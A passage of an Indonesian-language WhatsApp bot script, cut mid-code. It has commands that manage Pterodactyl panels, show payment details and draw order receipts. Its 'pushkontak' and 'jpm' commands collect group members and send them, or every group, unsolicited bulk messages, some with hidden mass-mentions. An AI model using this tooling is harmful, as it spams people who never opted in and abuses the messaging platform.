"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return ArroganzzReply(`Tidak ada admin panel di server ${text}`)
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${text} ${i.attributes.id}`
})
})
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: `List Admin Panel Server ${text}`, 
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[1] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return ArroganzzReply("Akun admin panel tidak ditemukan!")
await ArroganzzReply(`Berhasil menghapus akun admin panel *${capital(getid)}* di server panel ${args[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return ArroganzzReply(mess.owner)
if (serverpanel.length < 1) return ArroganzzReply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return ArroganzzReply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.delpanel* 1"))
if (serverpanel.length < 1) return ArroganzzReply("Tidak ada server panel")
if (Number(text) > serverpanel.length) return ArroganzzReply("Server panel tidak ditemukan")
indx = Number(args[0] - 1)
let egg = serverpanel[indx].egg
let nestid = serverpanel[indx].nestid
let loc = serverpanel[indx].loc
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
let capikey = serverpanel[indx].capikey
if (!args[1]) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ArroganzzReply(`Tidak ada panel di server ${text}`)
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${text} ${s.id}`
})
}

return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: `List Panel Server ${text}`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(args[1]) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return ArroganzzReply("Server panel tidak ditemukan!")
ArroganzzReply(`Berhasil menghapus panel *${capital(nameSrv)}* di server panel ${args[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak": {
if (!isOwner) return ArroganzzReply(mess.owner)
const meta = await XPanz.groupFetchAllParticipating()
let dom = await Object.keys(meta)
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.resavekontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Open Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: "© By Arroganzz - Botz",
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Yang Akan Di Save Kontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak": {
if (!isOwner) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("pesannya"))
const meta = await XPanz.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await XPanz.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await ArroganzzReply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await XPanz.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await XPanz.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak2": {
if (!isOwner) return ArroganzzReply(mess.owner)
if (!m.isGroup) return ArroganzzReply(mess.group)
if (!text) return ArroganzzReply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await XPanz.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await ArroganzzReply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await XPanz.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await XPanz.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslide": {
if (!isCreator) return ArroganzzReply(mess.owner)
let allgrup = await XPanz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await ArroganzzReply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await XPanz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return ArroganzzReply(mess.owner)
let allgrup = await XPanz.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await ArroganzzReply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await XPanz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmch": case "jpmallch": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (listidch.length < 1) return ArroganzzReply("Tidak ada id ch didalam database")
if (!q) return ArroganzzReply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await XPanz.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = listidch
const res = allgrup
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await ArroganzzReply(`Memproses jpmch *${opsijpm}* ke ${res.length} channel`)
for (let i of res) {
try {
await XPanz.sendMessage(i, pesancoy)
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await XPanz.sendMessage(jid, {text: `Jpmch *${opsijpm}* berhasil dikirim ke ${count} channel`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!q) return ArroganzzReply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await XPanz.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = await XPanz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await ArroganzzReply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await XPanz.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await XPanz.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmht": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!q) return ArroganzzReply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await XPanz.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = await XPanz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = text
const opsijpm = rest !== undefined ? "teks & foto ht" : "teks ht"
const jid = m.chat
await ArroganzzReply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
let ments = allgrup[i].participants.map(e => e.id)
let pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks, mentions: ments } : { text: ttks, mentions: ments }
await XPanz.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await XPanz.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmtesti": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!q) return ArroganzzReply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return ArroganzzReply(example("teks dengan mengirim foto"))
const allgrup = await XPanz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await XPanz.downloadAndSaveMediaMessage(qmsg)
await ArroganzzReply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await XPanz.sendMessage(i, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                 {
                  title: 'Digitalocean',
                  id: '.buydo'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
                  id: '.buyjasajpm'
                },
                {
                  title: 'Topup Saldo Ewallet',
                  id: '.topupsaldo'
                },
                {
                  title: 'Topup Diamonds',
                  id: '.topupdiamond'
                }, 
                {
                  title: 'Topup Pulsa',
                  id: '.isipulsa'
                }    
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await XPanz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pay": case "payment": case "qris": {
await XPanz.sendMessage(m.chat, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },
                {
                  title: 'OVO',
                  id: '.ovo'
                },                
                {
                  title: 'GOPAY',
                  id: '.gopay'
                },
                {
                  title: 'SHOPEEPAY',
                  id: '.shopepay'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.qriss}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await XPanz.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await XPanz.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await XPanz.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shopepay": {
if (!isCreator) return
let teks = `
*PAYMENT SHOPEPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.shopepay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await XPanz.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
ArroganzzReply(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "toaudio": case "tovn": {
if (!/video|mp4/.test(mime)) return ArroganzzReply(example("dengan reply/kirim vidio"))
const vid = await XPanz.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await XPanz.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "proses": {
  if (!text || !text.includes(',')) {
    return m.reply('❗ Format salah!\nContoh: .proses nokos,5000,dana')
  }

  const [barang, harga, metode] = text.split(',').map(v => v.trim())

  if (!barang || !harga || !metode) {
    return m.reply('❗ Format tidak lengkap!\nContoh: .proses barang,harga,pembayaran')
  }

  const canvasWidth = 600
  const canvasHeight = 450
  const canvas = createCanvas(canvasWidth, canvasHeight)
  const ctx = canvas.getContext('2d')

  ctx.fillStyle = "#fff"
  ctx.fillRect(0, 0, canvas.width, canvas.height)

  ctx.fillStyle = "#000"
  ctx.font = 'bold 20px monospace'
  ctx.textAlign = 'center'
  ctx.fillText('PESANAN SEDANG DIPROSES', canvasWidth / 2, 40)

  ctx.font = '14px monospace'
  ctx.fillText(`Tanggal/Waktu: ${tampilTanggal} ${tampilWaktu}`, canvasWidth / 2, 65)

  ctx.textAlign = 'left'
  ctx.fillText(`Layanan: ${barang}`, 20, 100)
  ctx.fillText(`Harga: Rp ${Number(harga).toLocaleString('id-ID')}`, 20, 130)

  ctx.fillText(`Metode Pembayaran: ${metode.toUpperCase()}`, 20, 160)

  ctx.beginPath()
  ctx.moveTo(20, 190)
  ctx.lineTo(canvasWidth - 20, 190)
  ctx.stroke()

  let subtotal = Number(harga)
  let totalPembayaran = subtotal

  ctx.fillText(`Total Pembayaran: Rp ${totalPembayaran.toLocaleString('id-ID')}`, 20, 220)

  ctx.beginPath()
  ctx.moveTo(20, 250)
  ctx.lineTo(canvasWidth - 20, 250)
  ctx.stroke()

  ctx.font = "bold 14px monospace"
  ctx.textAlign = "center"
  ctx.fillText("Mohon tunggu sebentar", canvasWidth / 2, 280)
  ctx.fillText("Pesanan Anda sedang diproses", canvasWidth / 2, 300)

  const dirPath = path.join(__dirname, 'tmp')
  if (!fs.existsSync(dirPath)) {
    fs.mkdirSync(dirPath)
  }

  const buffer = canvas.toBuffer("image/png")
  const filePath = path.join(dirPath, "pesanan_diproses.png")
  fs.writeFileSync(filePath, buffer)

  const caption = `
*—·· Pesanan Sedang Diproses  ··—*

* *Layanan:* ${barang}
* *Harga:* Rp ${Number(harga).toLocaleString('id-ID')}
* *Payment:* ${metode}
* *Tanggal:* ${tampilTanggal}
* *Waktu:* ${tampilWaktu} WIB

Mohon tunggu sebentar, pesanan Anda sedang diproses.
`.trim()

  await conn.sendMessage(m.chat, {
    image: { url: filePath },
    caption
  }, { quoted: m })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
if (!text || !text.includes(',')) {
    return ArroganzzReply('❗ Format salah!\nContoh: .done barang,harga,pembayaran')
  }

  const [barang, harga, metode] = text.split(',').map(v => v.trim())

  if (!barang || !harga || !metode) {
    return ArroganzzReply('❗ Pastikan semua data terisi dengan format benar:\n.done barang,harga,pembayaran')
  }

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
  const canvasWidth = 600
  const canvasHeight = 450
  const canvas = createCanvas(canvasWidth, canvasHeight)
  const ctx = canvas.getContext('2d')

  ctx.fillStyle = "#fff"
  ctx.fillRect(0, 0, canvas.width, canvas.height)

  ctx.fillStyle = "#000"
  ctx.font = 'bold 20px monospace'
  ctx.textAlign = 'center'
  ctx.fillText('STRUK PEMBAYARAN', canvasWidth / 2, 40)

  ctx.font = '14px monospace'
  ctx.fillText(`Tanggal/Waktu: ${waktu}`, canvasWidth / 2, 65)

  ctx.textAlign = 'left'
  ctx.fillText(`Layanan: ${barang}`, 20, 100)
  ctx.fillText(`Harga: Rp ${Number(harga).toLocaleString('id-ID')}`, 20, 130)

  ctx.fillText(`Metode Pembayaran: ${metode.toUpperCase()}`, 20, 160)

  ctx.beginPath()
  ctx.moveTo(20, 190)
  ctx.lineTo(canvasWidth - 20, 190)
  ctx.stroke()

  let subtotal = Number(harga)
  let totalPembayaran = subtotal

  ctx.fillText(`Total Pembayaran: Rp ${totalPembayaran.toLocaleString('id-ID')}`, 20, 220)

  ctx.beginPath()
  ctx.moveTo(20, 250)
  ctx.lineTo(canvasWidth - 20, 250)
  ctx.stroke()

  ctx.font = "bold 14px monospace"
  ctx.textAlign = "center"
  ctx.fillText("TERIMA KASIH TELAH BERBELANJA", canvasWidth / 2, 280)
  ctx.fillText("Jangan Lupa Kembali Lagi!", canvasWidth / 2, 300)

  const dirPath = path.join(__dirname, 'tmp')
  if (!fs.existsSync(dirPath)) {
    fs.mkdirSync(dirPath)
  }

  const buffer = canvas.toBuffer("image/png")
  const filePath = path.join(dirPath, "receipt.png")
  fs.writeFileSync(filePath, buffer)

  const caption = `
*—·· Transaksi Telah Selesai  ··—*

* *Layanan:* ${barang}
* *Harga:* Rp ${Number(harga).toLocaleString('id-ID')}
* *Payment:* ${metode}
* *Tanggal:* ${waktu}
* *Note:* Terimakasih Telah Mempercayai Kami
`.trim()

  await XPanz.sendMessage(m.chat, {
    image: { url: filePath },
    caption
  }, { quoted: m })
  }
  break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "developerbot": case "owner": {
await XPanz.sendContact(m.chat, [global.owner], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "save": case "sv": {
if (!isCreator) return
await XPanz.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "self": {
if (!isCreator) return
XPanz.public = false
ArroganzzReply("Berhasil mengganti ke mode *self*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getcase": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./Skyzopedia.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
ArroganzzReply(`${getcase(q)}`)
} catch (e) {
return ArroganzzReply(`Case *${text}* tidak ditemukan`)
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await ArroganzzReply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ip": {
if (!isCreator) return
let t = await fetchJson('https://api64.ipify.org?format=json')
ArroganzzReply(`IP Panel : ${t.ip}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "public": {
if (!isCreator) return
XPanz.public = true
ArroganzzReply("Berhasil mengganti ke mode *public*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": {
if (!isCreator) return ArroganzzReply(mess.owner)
await ArroganzzReply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel": case "upch": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("teksnya bisa dengan kirim foto"))
let res
if (/image/.test(mime)) res = await XPanz.downloadAndSaveMediaMessage(qmsg)
let content = res !== undefined ? { image: {url: res}, caption: text } : { text: text }
await XPanz.sendMessage(idSaluran, content)
ArroganzzReply("Berhasil mengirim pesan ke dalam channel whatsapp")
if (res !== undefined) await fs.unlinkSync(res)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upswtag": {
if (!isOwner) return ArroganzzReply(mess.owner)
if (!text) return ArroganzzReply(example("text & bisa dengan kirim foto"))
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await XPanz.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return XPanz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Tag\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "create-storywa": {
if (!isCreator) return ArroganzzReply(mess.owner)
if (global.textupsw == undefined) return

async function mentionStatus(jids, content) {
